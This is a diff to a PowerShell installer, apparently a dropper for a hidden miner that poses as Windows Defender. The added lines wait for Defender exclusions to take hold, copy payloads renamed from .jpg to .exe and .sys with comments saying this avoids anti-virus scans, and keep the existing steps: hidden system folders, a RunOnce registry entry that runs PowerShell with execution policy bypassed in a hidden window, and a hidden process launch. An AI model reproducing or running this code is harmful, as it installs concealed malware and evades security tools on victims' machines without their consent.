@@ -14,13 +14,15 @@ if (-not (Test-Path $folder2)) {
 Add-MpPreference -ExclusionPath $folder1
 Add-MpPreference -ExclusionPath $folder2
 
+Start-Sleep -Seconds 3 # wait for exclusion otherwise the files will be flagged
+
 $SourceDir = $PSScriptRoot
-Copy-Item "$SourceDir\Windows Defender.exe" -Destination $folder1 -Force
+Copy-Item "$SourceDir\Windows Defender.jpg" -Destination "$folder1\Windows Defender.exe" -Force # avoid anti-virus scan/delete
 Copy-Item "$SourceDir\config.json" -Destination $folder1 -Force
-Copy-Item "$SourceDir\WinRing0x64.sys" -Destination $folder1 -Force
-Copy-Item "$SourceDir\Windows Defender.exe" -Destination $folder2 -Force
+Copy-Item "$SourceDir\WinRing0x64.jpg" -Destination "$folder1\WinRing0x64.sys" -Force # avoid anti-virus scan/delete
+Copy-Item "$SourceDir\Windows Defender.jpg" -Destination $folder2 -Force
 Copy-Item "$SourceDir\config.json" -Destination $folder2 -Force
-Copy-Item "$SourceDir\WinRing0x64.sys" -Destination $folder2 -Force
+Copy-Item "$SourceDir\WinRing0x64.jpg" -Destination $folder2 -Force
 Copy-Item "$SourceDir\Msvcdefend.ps1" -Destination $folder2 -Force
 
 (Get-Item $folder1).Attributes += 'Hidden','System'
@@ -30,3 +32,4 @@ $command = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$
 Set-ItemProperty -Path $RunOnceKey -Name "Windows Defender" -Value $command -Type String
 Start-Process $file2 -WindowStyle Hidden
 exit
+
